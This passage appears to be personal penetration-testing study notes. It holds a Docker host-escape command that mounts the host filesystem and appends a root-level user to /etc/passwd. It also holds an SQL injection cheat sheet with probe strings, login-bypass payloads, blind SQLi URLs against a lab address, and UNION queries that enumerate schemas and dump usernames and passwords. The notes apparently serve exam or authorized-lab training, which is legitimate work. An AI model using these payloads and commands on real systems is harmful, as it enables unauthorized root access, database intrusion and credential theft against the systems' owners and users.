docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# generate passweord salt
openssl passwd -1 -salt balai

# Now add this users into the passwd file
cd /mnt/root/etc
echo 'balai:<saltpasswd>:0:0::/root:/bin/bash' >> passwd
tail passwd

```
#### SQL Injection
```Text
PORTSWIGGER CHEATSHEET:
https://portswigger.net/web-security/sql-injection/cheat-sheet
PAYLOADS:
'
)'
"
`
')
")
`)
'))
"))
`))
'-SLEEP(30); #
LOGIN BYPASS:
Both user and password or specific username and payload as password
' or 1=1 --
' or '1'='1
' or 1=1 --+
user' or 1=1;#
' and 1=1#
user' or 1=1 LIMIT 1;#
user' or 1=1 LIMIT 0,1;#
offsec' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
#If query accepts only one column
' or 1=1 in (SELECT password FROM users) -- //
#To retrieve specific user password
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
sql = "select count(user_name) from web_users where user_name='" + username + "' and password='" + userpass + "'";
Note: // comment indicated php is used in application
BOOLEAN BASED BLIND SQLI:
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
TIME BASED BLIND SQLI:
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
Note: When testing for blind we cant always expect 5xx when statement is wrong. Look if we get results if statement is correct, if statement 
is wrong we don’t get results.
' order by 1--
'order by 2-- (increment no. till we identify no. of columns)
'union select null-- (use the count of null identified using order by)
'union select @@version,null-- (identify version and others using cheatsheet)
#Identifying Name of Databases
' union SELECT schema_name,null,null,null FROM information_schema.schemata--
#Identifying Name of Tables present in a particular DB
' union SELECT TABLE_NAME,null,null,null FROM information_schema.TABLES WHERE table_schema='Staff'--
#Identifying Column name of a particular table
SQLi
23 February 2023 01:25
' union SELECT column_name,null,null,null FROM information_schema.columns WHERE table_name = 'StaffDetails'--
#Dumping Data
' union SELECT group_concat(Username,":",Password),null,null,null FROM users.UserDetails-- (last dbname.tablename)(else use database 
name at last its enough)
```
